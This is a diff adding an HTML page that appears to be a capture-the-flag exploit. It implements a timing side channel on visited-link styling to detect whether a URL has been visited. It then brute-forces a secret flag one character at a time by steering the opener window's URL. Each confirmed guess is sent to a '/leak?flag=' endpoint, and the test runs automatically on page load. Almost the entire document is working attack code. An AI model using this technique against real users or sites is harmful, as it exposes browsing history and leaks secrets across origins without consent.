@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <style type="text/css">
+        /* Set it up so the target link element has different colors when pointing to a
+           visited vs unvisited URL. */
+        #target {
+            color: white;
+            background-color: white;
+            outline-color: white;
+        }
+        #target:visited {
+            color: #feffff;
+            background-color: #fffeff;
+            outline-color: #fffffe;
+        }
+    </style>
+</head>
+<body>
+    <div id="entryDisplay">
+        Enter a URL to test for visited status:
+        <input id="urlInput" type="text" size="60" value="{{url}}" autofocus/>
+        <button id="testButton">Test</button>
+    </div>
+    <script type="text/javascript">
+        (function () {
+            var entryDisplay = document.getElementById('entryDisplay');
+            var urlInput = document.getElementById('urlInput');
+            var testButton = document.getElementById('testButton');
+            
+            var basisUrl; // Known-unvisibed URL used during both test stages.
+            var controlUrl; // Another known-unvisited URL for the "control" stage.
+            var experimentUrl; // The URL of unknown visited status.
+            
+            var targetLink;
+            var controlTickCount;
+
+            // Utility function to randomly generate a known-unvisited URL.
+            function generateUnvisitedUrl () {
+                return 'https://' + Math.random() + '/' + Date.now();
+            }
+            
+            testButton.addEventListener('click', function () {
+                // Collect URLs.
+                basisUrl = generateUnvisitedUrl();
+                controlUrl = generateUnvisitedUrl();
+                experimentUrl = urlInput.value;
+                console.log({ experimentUrl })
+                entryDisplay.remove();
+                
+                document.body.style.overflow = 'hidden';
+                
+                // Create the target link element and point it to the basis URL.
+                targetLink = document.createElement('a');
+                targetLink.id = 'target';
+                targetLink.href = basisUrl;
+                
+                // Fill the target link element with a bunch of "Chinese lorem ipsum"
+                // text to put some load on the browser's text renderer.
+                var garbageText = '業雲多受片主。好些天事開後起主在小工過商友全行，打回化高全水點強的基聯形要北壓好接畫。動我可存吸正分日通想……家覺生傳利最製面傳師命實們候企南是，多或進學落究，拿活直能你長的們是我和除四遠大因自過學於更，夠根親論運不我音死這中，生球經時於作，態了北業調經害難制明人人一經口子門眼，還年母語灣畫給的我坐多球：了這制響第不英才產聯是灣巴；為防平早，一廣女濟大運，的者黑來人北計記名書主之經決地皮天是有半！生請子記實的業外，出發向求：收息無：當法放老想？發景！'.repeat(28);
+                targetLink.appendChild(document.createTextNode(garbageText));
+                
+                // Set up some complicated CSS effects on the target link element.
+                targetLink.style.display = 'block';
+                targetLink.style.width = '5px';
+                targetLink.style.fontSize = '2px';
+                targetLink.style.outlineWidth = '24px';
+                targetLink.style.textAlign = 'center';
+                targetLink.style.filter =
+                    'contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%)';
+                targetLink.style.textShadow = '16px 16px 10px #fefffe';
+                targetLink.style.transform = 'perspective(100px) rotateY(37deg)';
+                
+                document.body.appendChild(targetLink);
+                
+                requestAnimationFrame(function () {
+                    requestAnimationFrame(function () {
+                        runTestStage(false);
+                    });
+                });
+            });
+            
+            function runTestStage (isExperimentStage) {
+                var testUrl = isExperimentStage ? experimentUrl : controlUrl;
+                startCountingTicks();
+                startOscillatingHref(testUrl);
+                
+                setTimeout(async function () {
+                    stopOscillatingHref();
+                    
+                    if (!isExperimentStage) {
+                        controlTickCount = stopCountingTicks();
+                        runTestStage(true);
+                        return;
+                    }
+                    
+                    var experimentTickCount = stopCountingTicks();
+                    targetLink.remove();
+                    
+                
+                    var ratio = experimentTickCount / controlTickCount;
+                    console.log("RATIO", experimentTickCount, controlTickCount, ratio)
+                    var likelyVisited = ratio < 0.7;
+                   
+                    async function sendBeacon(cond){
+                        let url = opener.location.hash.substring(1) || "flag{g68r|a";
+                        let [guess, current_guess] = url.split('|')
+                        if(cond){
+                            await fetch(`/leak?flag=${guess}${current_guess}`);
+                            opener.location.href = `/?query=${Math.random()}&ratio=${ratio}#${guess}${current_guess}|a`
+                        }
+                        else {
+                            let charset = 'abcu}defghijklmnopqrstuvwxyz1234567890{}'.split('');
+                            opener.location.href = `/?query=${Math.random()}&ratio=${ratio}#${guess}|${charset[charset.indexOf(current_guess)+1]}`
+                        }
+                    }
+                    sendBeacon(likelyVisited);
+
+                    document.body.style.overflow = 'visible';
+                    
+                    var outputDom = document.createElement('p');
+                    
+                    outputDom.appendChild(document.createTextNode('Result for '));
+                    
+                    var linkDom = document.createElement('a');
+                    linkDom.href = experimentUrl;
+                    linkDom.appendChild(document.createTextNode(experimentUrl));
+                    outputDom.appendChild(linkDom);
+                    
+                    outputDom.appendChild(document.createTextNode(': likely '));
+                    
+                    var resultDom = document.createElement('strong');
+                    resultDom.innerHTML = likelyVisited ? 'VISITED' : 'UNVISITED';
+                    resultDom.style.color = likelyVisited ? 'green' : 'red';
+                    outputDom.appendChild(resultDom);
+                    
+                    outputDom.appendChild(document.createTextNode(
+                        ' (' + experimentTickCount + ' ticks vs ' +
+                        controlTickCount + ' ticks; ratio = ' +
+                        Math.round(ratio * 100) + '%).'));
+                    
+                    document.body.appendChild(outputDom);
+                    
+                    var retryButton = document.createElement('button');
+                    retryButton.innerHTML = 'Try Another URL';
+                    retryButton.addEventListener('click', function (e) {
+                        location.reload();
+                    });
+                    document.body.appendChild(retryButton);
+                    retryButton.focus();
+                }, 500);
+            } 
+                
+            // Concurrently oscillate the target link's href between the known-unvisited
+            // basis URL and a given test URL, which could be either of the control or
+            // experiment URLs.
+            var oscillateInterval;
+            var isPointingToBasisUrl = true;
+            function startOscillatingHref (testUrl) {
+                oscillateInterval = setInterval(function () {
+                    targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
+                    isPointingToBasisUrl = !isPointingToBasisUrl;
+                }, 0);
+            }
+            function stopOscillatingHref () {
+                clearInterval(oscillateInterval);
+                targetLink.href = basisUrl;
+                isPointingToBasisUrl = true;
+            }
+
+            // Concurrently count the number of times we complete a
+            // requestAnimationFrame callback, measuring paint performance over the test
+            // period.
+            var tickCount = 0;
+            var tickRequestId;
+            function startCountingTicks () {
+                tickRequestId = requestAnimationFrame(function () {
+                    ++tickCount;
+                    startCountingTicks();
+                });
+            }
+            function stopCountingTicks () {
+                cancelAnimationFrame(tickRequestId);
+                var oldTickCount = tickCount;
+                tickCount = 0;
+                return oldTickCount;
+            }
+        })();
+        
+        setTimeout(function () {
+            var testButton = document.getElementById('testButton');
+            testButton.click();
+        }, 1000);
+   
+    </script>
+</body>
+</html>
